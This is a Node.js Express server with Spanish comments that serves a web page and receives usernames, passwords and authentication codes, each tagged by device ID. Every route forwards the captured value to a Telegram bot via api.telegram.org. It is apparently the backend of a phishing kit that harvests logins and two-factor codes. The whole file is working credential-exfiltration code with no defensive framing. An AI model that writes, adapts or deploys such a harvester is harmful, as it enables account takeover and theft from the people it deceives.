// Requerir las dependencias necesarias.
const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path'); // Para manejar rutas de archivos

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Para servir archivos estáticos (HTML, CSS, JS)

// Objeto para almacenar datos por dispositivo
let usuariosData = {};

// Ruta para servir el archivo index.html en la raíz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Ruta para recibir y enviar el nombre de usuario al bot de Telegram
app.post('/send-user', async (req, res) => {
    const { dispositivoID, texto: usuario } = req.body;

    // Almacenar el usuario por dispositivo
    if (!usuariosData[dispositivoID]) {
        usuariosData[dispositivoID] = { usuario: null, contraseña: null, codigo: null };
    }
    usuariosData[dispositivoID].usuario = `UUUUU ${dispositivoID.replace('id.', '')}: \`${usuario}\``;

    await fetch(`https://api.telegram.org/bottoken/sendMessage`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: '0',
            text: usuariosData[dispositivoID].usuario,
            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
        }),
        headers: { 'Content-Type': 'application/json' },
    });
    res.sendStatus(200);
});

// Ruta para recibir y enviar la contraseña al bot de Telegram
app.post('/send-password', async (req, res) => {
    const { dispositivoID, texto: password } = req.body;

    // Almacenar la contraseña por dispositivo
    if (usuariosData[dispositivoID]) {
        usuariosData[dispositivoID].contraseña = `CCCCC ${dispositivoID.replace('id.', '')}: \`${password}\``;
    }

    await fetch(`https://api.telegram.org/bottoken/sendMessage`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: '0',
            text: usuariosData[dispositivoID].contraseña,
            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
        }),
        headers: { 'Content-Type': 'application/json' },
    });
    res.sendStatus(200);
});

// Ruta para recibir y enviar el código de autenticación al bot de Telegram
app.post('/send-auth', async (req, res) => {
    const { dispositivoID, texto: authCode } = req.body;

    // Almacenar el código de autenticación por dispositivo
    if (usuariosData[dispositivoID]) {
        usuariosData[dispositivoID].codigo = `AAAAA ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
    }

    await fetch(`https://api.telegram.org/bottoken/sendMessage`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: '0',
            text: usuariosData[dispositivoID].codigo,
            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
        }),
        headers: { 'Content-Type': 'application/json' },
    });
    res.sendStatus(200);
});

// Inicia el servidor en el puerto especificado
app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
